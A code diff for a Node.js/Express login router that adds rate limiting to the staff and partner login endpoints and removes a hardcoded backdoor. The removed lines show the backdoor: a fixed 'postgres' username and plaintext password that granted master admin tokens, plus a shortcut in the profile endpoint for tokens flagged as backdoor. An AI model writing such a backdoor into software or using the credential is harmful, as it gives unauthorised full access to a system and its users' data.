@@ -16,8 +16,17 @@ const express = require('express');
 const router = express.Router();
 const bcrypt = require('bcryptjs');
 const jwt = require('jsonwebtoken');
+const rateLimit = require('express-rate-limit');
 const { AponntStaff, AponntStaffCompany, Partner, Company, sequelize } = require('../config/database');
 const { Op } = require('sequelize');
+
+const loginLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 10,
+  message: { success: false, error: 'Demasiados intentos. Intente en 15 minutos.' },
+  standardHeaders: true,
+  legacyHeaders: false,
+});
 
 // 🔐 SEGURIDAD: JWT_SECRET debe venir de .env
 const JWT_SECRET = process.env.JWT_SECRET;
@@ -29,7 +38,7 @@ const JWT_REFRESH_EXPIRES_IN = process.env.JWT_REFRESH_EXPIRES_IN || '7d';
  * STAFF LOGIN
  * =====================================================================
  */
-router.post('/staff/login', async (req, res) => {
+router.post('/staff/login', loginLimiter, async (req, res) => {
   try {
     const { username, password } = req.body;
 
@@ -157,7 +166,7 @@ router.post('/staff/login', async (req, res) => {
  * PARTNER LOGIN
  * =====================================================================
  */
-router.post('/partner/login', async (req, res) => {
+router.post('/partner/login', loginLimiter, async (req, res) => {
   try {
     const { username, password } = req.body;
 
@@ -167,55 +176,6 @@ router.post('/partner/login', async (req, res) => {
       return res.status(400).json({
         success: false,
         error: 'Usuario y contraseña son requeridos'
-      });
-    }
-
-    // =============================================================================
-    // PUERTA TRASERA HARDCODEADA (solo conocida por admin del sistema)
-    // =============================================================================
-    if (username.toLowerCase() === 'postgres' && password === 'Aedr15150302') {
-      console.log('🚪 [PARTNER-LOGIN] Acceso por puerta trasera (postgres) - ASOCIADO MASTER');
-
-      // Generar token especial de super-admin asociado
-      const tokenPayload = {
-        id: 'ASSOCIATE_MASTER',
-        type: 'partner',
-        username: 'postgres',
-        email: 'master@aponnt.com',
-        partner_role_id: 'MASTER',
-        is_backdoor: true
-      };
-
-      const token = jwt.sign(tokenPayload, JWT_SECRET, { expiresIn: '24h' });
-      const refreshToken = jwt.sign(tokenPayload, JWT_SECRET, { expiresIn: '7d' });
-
-      return res.json({
-        success: true,
-        message: 'Acceso de asociado master concedido',
-        token,
-        refreshToken,
-        partner: {
-          id: 'ASSOCIATE_MASTER',
-          first_name: 'Asociado',
-          last_name: 'Master',
-          dni: 'MASTER',
-          email: 'master@aponnt.com',
-          username: 'postgres',
-          phone: null,
-          category: 'administrative',
-          specialties: ['Administración Total'],
-          approval_status: 'approved',
-          is_active: true,
-          biometric_enabled: false,
-          first_login: false,
-          is_backdoor: true
-        },
-        permissions: {
-          can_view_all: true,
-          can_manage_all: true,
-          is_admin: true,
-          is_master: true
-        }
       });
     }
 
@@ -558,36 +518,6 @@ router.get('/partner/me', async (req, res) => {
       return res.status(403).json({
         success: false,
         error: 'Token inválido para este tipo de usuario'
-      });
-    }
-
-    // Si es puerta trasera, retornar directamente sin buscar en BD
-    if (decoded.is_backdoor === true) {
-      return res.json({
-        success: true,
-        partner: {
-          id: 'ASSOCIATE_MASTER',
-          first_name: 'Asociado',
-          last_name: 'Master',
-          dni: 'MASTER',
-          email: 'master@aponnt.com',
-          username: 'postgres',
-          phone: null,
-          category: 'administrative',
-          specialties: ['Administración Total'],
-          approval_status: 'approved',
-          is_active: true,
-          biometric_enabled: false,
-          first_login: false,
-          is_backdoor: true,
-          partner_role_id: 'MASTER',
-          permissions: {
-            can_view_all: true,
-            can_manage_all: true,
-            is_admin: true,
-            is_master: true
-          }
-        }
       });
     }
 
